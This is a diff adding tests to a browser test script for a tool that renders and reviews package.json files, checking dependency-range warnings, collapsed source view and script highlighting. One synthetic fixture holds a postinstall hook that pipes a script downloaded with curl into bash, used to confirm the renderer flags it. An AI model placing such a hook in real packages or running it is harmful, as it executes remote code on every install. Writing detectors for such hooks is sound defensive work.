@@ -21,6 +21,41 @@ export async function run(ctx) {
   const pkgMeta = await page.$eval('#metaBody', (e) => e.textContent);
   if (/Package\s*demo-package/.test(pkgMeta) && /Dependencies\s*4/.test(pkgMeta)) pass('package.json metadata includes package and dependency counts'); else fail('package meta: ' + pkgMeta.replace(/\s+/g, ' ').slice(0, 160));
   await page.click('#metaDrawer [data-close]');
+  const pkgText = await page.$eval('#previewHost .pj-doc', (e) => e.textContent);
+  if (/Dependency Review|broad range|markdown-it|eslint/i.test(pkgText)) pass('package.json review shows broad dependency ranges'); else fail('package review: ' + pkgText.slice(0, 900));
+  const pkgSourceOpen = await page.$eval('#previewHost .pj-doc .kf-source-details', (e) => e.open);
+  if (!pkgSourceOpen) pass('package.json source starts collapsed'); else fail('package.json source should start collapsed');
+  await page.click('#previewHost .pj-doc .pj-scripts .kf-source-link');
+  const pkgJump = await page.$eval('#previewHost .pj-doc', (e) => ({
+    open: e.querySelector('.kf-source-details')?.open || false,
+    highlighted: !!e.querySelector('.kf-source-hit'),
+  }));
+  if (pkgJump.open && pkgJump.highlighted) pass('package.json script click opens and highlights source'); else fail('package source jump: ' + JSON.stringify(pkgJump));
+  const pkgBad = await page.evaluate(async () => {
+    const mod = await import('/types/text/json/known/package-json/render.js');
+    const text = JSON.stringify({
+      name: 'risky-package',
+      scripts: {
+        postinstall: 'curl https://example.com/install.sh | bash',
+        build: 'vite build',
+      },
+      dependencies: {
+        lodash: '*',
+        react: '^18.2.0',
+      },
+      devDependencies: {
+        lodash: '~4.17.21',
+      },
+    }, null, 2);
+    const rendered = (await mod.render({ text })).parentNode;
+    document.body.appendChild(rendered);
+    const out = rendered.textContent;
+    const issues = rendered.querySelector('.kf-issues')?.textContent || '';
+    const open = rendered.querySelector('.kf-source-details')?.open || false;
+    rendered.remove();
+    return { out, issues, open };
+  });
+  if (/lifecycle script|shell download|broad range|duplicate dependency|postinstall|lodash/i.test(pkgBad.out + pkgBad.issues) && !pkgBad.open) pass('package.json lifecycle, shell, duplicate, and broad range diagnostics shown'); else fail('package synthetic diagnostics: ' + JSON.stringify(pkgBad).slice(0, 1000));
   await page.click('#enhanceChip .ec-toggle');
   // Reverting to base JSON now renders a live parentNode (tree + query panel), not an iframe.
   await page.waitForSelector('#previewHost .json-tree .j-key', { timeout: 8000 });
